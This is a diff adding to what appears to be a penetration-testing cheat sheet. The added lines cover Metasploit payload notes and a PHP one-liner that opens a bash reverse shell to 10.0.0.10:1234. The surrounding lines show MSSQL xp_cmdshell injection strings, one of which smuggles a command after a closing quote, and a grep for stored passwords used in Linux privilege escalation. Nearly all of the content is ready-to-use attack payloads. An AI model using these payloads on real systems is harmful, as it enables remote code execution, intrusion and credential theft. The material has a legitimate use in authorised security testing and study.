@@ -30,6 +30,17 @@ MSSQL
 - EXEC master..xp_cmdshell 'whoami';
 - meh' exec master..xp_cmdshell 'whoami' --
 
+Payloads
+----------------
+- https://www.offensive-security.com/metasploit-unleashed/payloads/
+- non staged = netcat
+- staged = multi/handler
+
+PHP
+----------------
+- https://stackoverflow.com/questions/20072696/what-is-different-between-exec-shell-exec-system-and-passthru-functions?lq=1
+- <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
+
 Priv Esc - Linux
 ----------------
 - grep -Ri 'password' .
